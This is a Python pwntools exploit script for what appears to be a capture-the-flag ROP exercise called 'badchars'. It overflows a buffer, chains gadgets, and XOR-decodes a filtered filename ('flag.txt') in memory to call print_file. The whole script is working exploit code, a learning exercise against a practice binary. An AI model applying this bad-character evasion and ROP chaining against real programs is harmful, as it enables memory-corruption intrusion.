# Bad characters 'x', 'g', 'a', '.'
# x=78 g=67 a=61 .=2E

from pwn import *
p = process('./badchars')

	# Setup padding
padding = b"F"*40

	# Gadgets
xor_byte_r15_r14b = p64(0x400628)	# Preform XOR operation on r15 with r14
mov_qword_r13_r12 = p64(0x400634)	# Move input to r13
print_file = p64(0x400510)		# Calls Print_file function
store_var = 0x601038			# Location to store assembled string

	# Stack manipulation
pop_rdi = p64(0x4006a3)			# Move to first register (First arg)
pop_stacks = p64(0x40069c)		# Pops registry values: r12 r13 r14 r15
pop_r14_r15 = p64(0x4006a0)		# Pops registry values: r14 r15

fileName = "dnce,vzt"
fileName = int(fileName.encode("utf-8").hex(),16)
fileName = bytes.fromhex(hex(2 ^ fileName)[2:])


	# Create exploit
payload = padding					# OverFlow the Buffer
payload += pop_stacks					# Clear stack r12 - r15
payload += fileName + p64(store_var) + p64(1) + p64(1)	# Push encoded file name into r12 and location to store into r13
payload += mov_qword_r13_r12				# Store contents of r12 in r13
							#	File name into store location


for i in range(8):
	payload += pop_r14_r15				# Pop r14 and r15 to store values to do operations on
	payload += p64(2) + p64(store_var + i)		# r14 = XOR val(2) r15= char to XOR
							#	Use i to incerement next character to xor with
	payload += xor_byte_r15_r14b			# XOR values

payload += pop_rdi					# Clear arguments
payload += p64(store_var)				# Call assembled string
payload += print_file					# Print file with the assembled string

	# Pass ROP chain to binary
print(payload)
p.sendline(payload)

	#Debugging ROP Chain
f = open("exp","wb")
f.write(payload)
f.close

	# Print response
response = p.recvall()
print(response.decode("utf-8"))

